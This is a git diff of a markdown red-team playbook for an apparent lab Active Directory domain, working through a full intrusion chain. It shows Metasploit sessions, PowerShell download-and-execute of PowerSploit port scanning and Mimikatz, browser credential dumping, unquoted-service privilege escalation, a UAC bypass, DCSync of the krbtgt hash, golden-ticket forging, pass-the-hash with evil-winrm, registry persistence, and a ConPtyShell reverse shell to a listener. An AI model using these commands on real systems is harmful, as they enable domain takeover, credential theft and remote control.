@@ -1,12 +1,15 @@
 ### PATH
 ```
 win11 ludus\domainuser -> Enumeration, CredentialKatz, Documents Exfiltration -> unquoted service exploit >
-win11 ludus\domainadmin -> UAC Bypass + Dump Creds > winrm to win-server
-win-server ludus\domainadmin - mimikatz golden ticket  > Administrator
+win11 ludus\domainadmin -> UAC Bypass >
+win11 ludus\domainadmin priviledged -> mimikatz golden ticket download -> dump password evil-winrm >
+win-server priviledged ludus\domainadmin
 ```
 
 ### win11 ludus\domainuser
 ```bash
+7z x -pinfected -mhe tools.7z tools
+
 msfconsole -r user_handler.rc
 # windows run command on win11
 sessions
@@ -113,12 +116,14 @@ powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('h
 
 # portscan
 powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 10.5.20.0/24 -Ports '22,3389,5985,5986'"
+```
 
-powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 10.5.20.0/24 -Ports '3389'"
-
+```bash
 use post/windows/gather/credentials/windows_autologin
 set session 1
 run
+
+evil-winrm -i 10.5.20.14 -u domainadmin -p password
 ```
 
 ### Exfiltration
@@ -127,6 +132,8 @@ run
 cd %TEMP%
 upload CredentialKatz.exe
 .\CredentialKatz.exe
+
+# or it is possible to
 Get-Process msedge
 procdump -ma 1220 msedge_dump.dmp
 
@@ -148,8 +155,8 @@ icacls "C:\Users\Public\Disk.exe" /grant Everyone:F
 sc stop "DiskSorter"
 sc start "DiskSorter"
 
-ps | grep Notepad
-migrate <notepad_pid>
+ps | grep teams
+migrate <teams>
 ```
 
 ### win11 ludus\domainadmin
@@ -159,9 +166,9 @@ cd %TEMP%
 upload Akagi64.exe
 shell
 
-
 .\Akagi64.exe 33 "C:\Users\Public\Disk.exe"
 
+# this does not work
 load kiwi
 creds_all
 hashdump
@@ -171,35 +178,39 @@ python3 ~/Desktop/tools/impacket/examples/psexec.py 'domainadmin@10.5.20.13' -ha
 psexec \\10.5.20.13 -i -u ludus\domainadmin -p password cmd.exe
 ```
 
-msfconsole -r admin_handler.rc
-
 ## MIMI
 
-```
+```shell
 # mimikatz
 powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
 ```
 
 
-```
+```shell
 # you need administrator priviledges
+cd %TEMP%
 .\mimikatz.exe
 privilege::debug
 
-lsadump::lsa /patch
+lsadump::dcsync /user:ludus\domainadmin
+evil-winrm -i 10.5.20.13 -u domainadmin -H 8846f7eaee8fb117ad06bdd830b7586c
 
+lsadump::dcsync /user:ludus\krbtgt
+# /krbtgt:Hash NTLM
+kerberos::golden /user:Administrator /domain:controller.local /krbtgt:93c7fd662a834869db8ad4bee4876299
+download "C:\Users\Public\ticket.kirbi"
+
+# does not work
+lsadump::lsa /patch
 sekurlsa::logonpasswords
 lsadump::sam
-
-
 lsadump::lsa /inject /name:krbtgt
 kerveros::golden /user: /domain: /sid: /krbtgt: /id: 
 misc::cmd
 PsExec.exe \\Desktop-1 cmd.exe
-
-lsadump::dcsync /user:ludus\krbtgt
-kerberos::golden /user:Administrator /domain:controller.local /krbtgt:93c7fd662a834869db8ad4bee4876299
 ```
+
+## Optional 
 
 ### Reg Keys Persistence On Domain Member
 ```
@@ -221,4 +232,10 @@ show option
 set SERVICE_NAME lsass
 set sessions 2
 run 
+```
+
+### raw revshell
+```bash
+stty raw -echo; (stty size; cat) | nc -lvnp 1337
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.5.30.50 1337
 ```
